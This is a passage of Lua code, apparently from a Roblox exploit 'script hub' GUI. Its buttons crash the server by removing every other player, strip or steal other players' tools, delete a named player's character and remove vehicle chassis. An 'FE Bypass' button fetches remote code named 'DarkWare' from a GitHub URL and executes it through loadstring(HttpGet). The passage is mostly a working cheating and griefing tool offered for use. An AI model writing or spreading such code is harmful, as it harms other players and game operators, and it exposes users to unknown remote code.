		view.MouseButton1Click:Connect(function()
			for i, v in pairs(GetPlayer(player.Text)) do
				if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
					cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
				end
			end
		end)

		unview.MouseButton1Click:Connect(function()
			if LocalPlayer.Character:FindFirstChild("Humanoid") then
				cam.CameraSubject = LocalPlayer.Character.Humanoid
			end
		end)

		shutdown.MouseButton1Click:Connect(function()
			sdown = true
			Notify("Shutdown", "Shutdowning server..", 5)
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				spawn(function()
					if v.Name ~= LocalPlayer.Name then
						work(v)
						repeat wait() until not game:GetService("Players"):FindFirstChild(v)
						work(LocalPlayer)
					end
				end)
			end
		end)

		rtools.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					backpack = game:GetService("Players")[v]["Backpack"] or game:GetService("Players")[v]:WaitForChild("Backpack")
					for i,t in pairs(backpack:GetChildren()) do
						if t:IsA("BackpackItem") and t:FindFirstChild("Handle") then
							work(t)
						end
					end
				end)
			end
		end)

		stools.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid"))
					repeat wait() until game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
					for i,v in pairs(game:GetService("Players")[v].Character:GetChildren()) do
						if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
							LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
						end
					end
				end)
			end
		end)

		punish.MouseButton1Click:Connect(function()
			for i,v in pairs(GetPlayer(player.Text)) do
				spawn(function()
					work(game:GetService("Players")[v].Character)
				end)
			end
		end)

		rchassis.MouseButton1Click:Connect(function()
			for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if string.match(v.Name, "Chassis") then
					work(v)
				end
			end
		end)
	end
end)

FeGamepass.Name = "FeBypassSelecteds"
FeGamepass.Parent = ScrollingFrame
FeGamepass.Size = UDim2.new(0, 137, 0, 23)
FeGamepass.BorderColor3 = Color3.fromRGB(0, 0, 0)
FeGamepass.Position = UDim2.new(0.651315808, 0, 0.0922147781, 0)
FeGamepass.BorderSizePixel = 0
FeGamepass.BackgroundColor3 = Color3.fromRGB(244, 244, 244)
FeGamepass.TextColor3 = Color3.fromRGB(0, 0, 0)
FeGamepass.Text = "FE Bypass (SelectedGames)"
FeGamepass.TextSize = 14
FeGamepass.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
FeGamepass.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/The-Elite-Soldier/main/DarkWare'))()
end)

Close.Name = "Close"
Close.Parent = Main_2
Close.Size = UDim2.new(0, 123, 0, 13)
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.Position = UDim2.new(0.695175409, 0, 0, 0)
Close.BorderSizePixel = 0
Close.BackgroundColor3 = Color3.fromRGB(255, 94, 30)
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.Text = "Close"
Close.TextSize = 14
Close.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
Close.MouseButton1Down:Connect(function()
	Open.Visible = true
	Main_2.Visible = false
        NotifyModule:Notify("Closed!", 2)
end)

print("Main Frame Loaded")
print("Adding Drag V1")

local UserInputService = game:GetService("UserInputService")

local gui = Main_2

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

print("Loaded")
NotifyModule:Notify("Thanks For Using More TouseefX Script Hub!:)", 5)
